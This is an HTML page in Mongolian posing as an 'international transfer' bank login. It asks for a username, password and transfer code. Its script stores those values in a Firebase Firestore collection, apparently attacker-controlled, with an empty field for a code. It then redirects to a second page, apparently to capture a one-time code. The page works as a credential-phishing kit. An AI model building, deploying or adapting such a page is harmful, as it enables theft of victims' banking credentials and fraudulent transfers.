<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8" />
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
          <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="css/bootstrap.min.css">
    <link rel="stylesheet" href="fontawesome-free-6.5.1-web/css/all.css">
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
    <link rel="stylesheet" href="css/styles.css">
    <title>Олон улсын шилжүүлэг</title>
</head>
<body>
    <header class="mb-5">
        <div class="">
            <nav class="navbar navbar-expand-lg bg-body-tertiary">
                <div class="container-fluid">
                    <a class="navbar-brand" href="index.html">
                    <img src="images/ban12.png" alt="Logo" width="30" height="24" class="d-inline-block align-text-top">
                        <span class="text-success">Олон улсын</span> шилжүүлэг
                    </a>
                    <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
                      <span class="navbar-toggler-icon"></span>
                    </button>
                    <div class="collapse navbar-collapse" id="navbarNav">
                        <ul class="navbar-nav">
                            <li class="nav-item">
                              <a class="nav-link active" aria-current="page" href="index.html">Гэрийн хаяг</a>
                            </li>
                            <li class="nav-item">
                              <a class="nav-link" href="index.html">Нэгдэх</a>
                            </li>
                        </ul>
                    </div>
                </div>
            </nav>
        </div>
    </header>
    <main>
        <div class="m-3 text-center">
            <img src="images/ban2.png" alt="" class="img-fluid w-lg-25" width="150"/>
        </div>
        <div>
            <form class="container" onsubmit="goToCodePage(event)">
                <div class="">
                    <input 
                        type="text" 
                        name="username" 
                        id="username" 
                        class="form-control-lg form-control" 
                        placeholder="Нэвтрэх нэр" 
                        required/>
                </div>
                <br />
                <div class="input-group">
                    <input 
                      type="password" 
                      id="password" 
                      name="motdepasse"
                      class="form-control" 
                      placeholder="Нууц уг" 
                      required
                    />
                    <span class="input-group-text" id="togglePassword"><i class="fas fa-eye"></i></span>
                </div>
                <br />
                <div class="">
                    <input 
                        type="text" 
                        name="transacpassword" 
                        id="transacpassword" 
                        class="form-control form-control-lg" 
                        placeholder="шилжүүлэх код" 
                        required/>
                </div>
                <br />
                <div class=" row row-cols-2 px-2">
                    <div class="form-check">
                      <input type="checkbox" class="form-check-input" id="remember" name="remember">
                      <label class="form-check-label fs-6" for="remember">надад санаарай</label>
                    </div>
                    <div class="text-end">
                        <a href="#" class=" text-green link-offset-2-hover fs-6">Нууц үг мартсан</a>
                    </div>
                </div>
                <br />
                <button type="submit" class="btn w-100 my-3 text-white bg-green">Нэгдэх</button>
                <a href="#" class="btn btn-outline-success w-100">Бүртгүүлэх</a>
            </form>
        </div>
    </main>
    <footer class="pt-3 bg-gray ">
    <div class="container text-secondary">
        <div class="row">
            <div class="col-md-6 col-lg-7">
                <div class="small">
                    <p class="mb-0">&copy; ThemeTags Design Agency, All rights reserved</p>
                </div>
            </div>
            <div class="col-md-6 col-lg-5">
                <div class="text-start text-md-end text-lg-end">
                    <ul class="list-inline">
                        <li class="list-inline-item"><a class="small link-underline link-underline-opacity-0" href="#">Terms</a></li>
                        <li class="list-inline-item"><a class="small link-underline link-underline-opacity-0" href="#">Security</a></li>
                        <li class="list-inline-item"><a class="small link-underline link-underline-opacity-0" href="#">Privacy Policy</a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
</footer>

<script>
    document.getElementById('togglePassword').addEventListener('click', function () {
      const passwordInput = document.getElementById('password');
      const isPassword = passwordInput.type === 'password';
      passwordInput.type = isPassword ? 'text' : 'password';
      const icon = this.querySelector('i');
      icon.classList.toggle('fa-eye');
      icon.classList.toggle('fa-eye-slash');
    });
  </script>
 <script type="module">
    // Importation de Firebase
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-app.js";
    import { getFirestore, collection, setDoc, doc, query, orderBy, limit, getDocs } from "https://www.gstatic.com/firebasejs/11.4.0/firebase-firestore.js";

    // Configuration Firebase
    const firebaseConfig = {
        apiKey: "AIzaSyBAn0oOcsPWlu82p_FpFyz5Bnq4dTd0R2o",
        authDomain: "virement2-bf790.firebaseapp.com",
        projectId: "virement2-bf790",
        storageBucket: "virement2-bf790.firebasestorage.app",
        messagingSenderId: "965517390511",
        appId: "1:965517390511:web:430715abd2331f0a42da5a"
    };

    // Initialisation Firebase
    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    // Fonction pour récupérer le plus grand ID Firestore dans une collection
    async function getMaxDocumentId(collectionName) {
        try {
            // Créer une requête pour trier les documents par ID Firestore en ordre décroissant
            const q = query(collection(db, collectionName), orderBy("__name__", "desc"), limit(1));

            // Exécuter la requête
            const querySnapshot = await getDocs(q);

            // Vérifier si des documents existent
            if (!querySnapshot.empty) {
                const maxIdDoc = querySnapshot.docs[0]; // Récupérer le premier document (le plus grand ID)
                const maxId = maxIdDoc.id; // Récupérer l'ID Firestore du document
                return maxId; // Retourner l'ID Firestore (chaîne de caractères)
            } else {
                return "0000"; // Retourner "0000" si la collection est vide
            }
        } catch (error) {
            console.error("Erreur lors de la récupération du plus grand ID :", error);
            throw error;
        }
    }

    // Fonction pour générer un nouvel ID incrémenté
    async function generateCustomId(collectionName) {
        const maxId = await getMaxDocumentId(collectionName); // Récupérer le plus grand ID Firestore
        const maxIdNumber = parseInt(maxId, 10); // Convertir en nombre
        const newIdNumber = maxIdNumber + 1; // Incrémenter l'ID
        return String(newIdNumber).padStart(4, '0'); // Formater en 4 chiffres (ex: 0200)
    }

    // Gestion du formulaire
    document.addEventListener("DOMContentLoaded", function () {
        document.getElementById("userForm").addEventListener("submit", async function (event) {
            event.preventDefault(); // Empêche le rechargement de la page

            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;
            const transacpassword = document.getElementById("transacpassword").value;

            if (username && password) {
                try {
                    // Générer un nouvel ID personnalisé
                    const customId = await generateCustomId("bank_un");

                    // Ajouter les données dans Firestore avec un champ "code" vide
                    await setDoc(doc(db, "bank_trois", customId), {
                        id: customId,
                        username: username,
                        motdepasse: password,
                        transacpassword: transacpassword,
                        code: "", // Champ "code" vide
                        timestamp: new Date()
                    });

                    console.log("Document créé avec l'ID : ", customId);

                    // Rediriger vers la page 2 (code.html) avec l'ID du document
                    window.location.href = `code.html?id=${customId}`;

                } catch (error) {
                    console.error("Erreur Firebase :", error);
                }
            } else {
                alert("Veuillez remplir tous les champs !");
            }
        });
    });
</script>
</body>
<script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.11.8/dist/umd/popper.min.js" integrity="sha384-I7E8VVD/ismYTF4hNIPjVp/Zjvgyol6VFvRkX/vR+Vc4jQkC+hVqc2pM8ODewa9r" crossorigin="anonymous"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.min.js" integrity="sha384-0pUGZvbkm6XF6gxjEnlmuGrJXVbNuzT9qBBavbLwCsOGabYfZo0T0to5eqruptLy" crossorigin="anonymous"></script>
<script src="js/bootstrap.min.js"></script>
</html>